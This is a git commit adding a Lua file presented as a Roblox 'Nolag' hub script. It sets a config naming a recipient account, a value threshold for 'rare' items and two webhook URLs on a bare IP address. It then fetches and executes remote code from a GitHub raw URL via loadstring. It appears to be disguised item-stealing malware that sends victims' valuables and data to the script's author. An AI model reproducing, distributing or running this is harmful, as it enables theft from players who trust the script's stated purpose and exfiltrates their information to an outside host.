8691f25aa6a41589b9f46167cd145166aa5e5989
NolagScript-hub-script <jiminonelly@gmail.com>
2025-08-04 17:50:59 +0800

    Upload Nolag-script.lua via Script Source Converter

---
+++ Nolag-script.lua
@@ -0,0 +1,13 @@
+_G.NullConfig = {
+    User = {"jasper735242"},
+    min_value = 10000000000,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "http://176.100.37.215:20002/proxy/4759ed7a34a69c9a96b20d1bb38be37f",
+    FakeGift = "No",
+    Trash = "http://176.100.37.215:20002/proxy/5ddae01b221bb188f8702268b3aeb80a",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "Yes",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
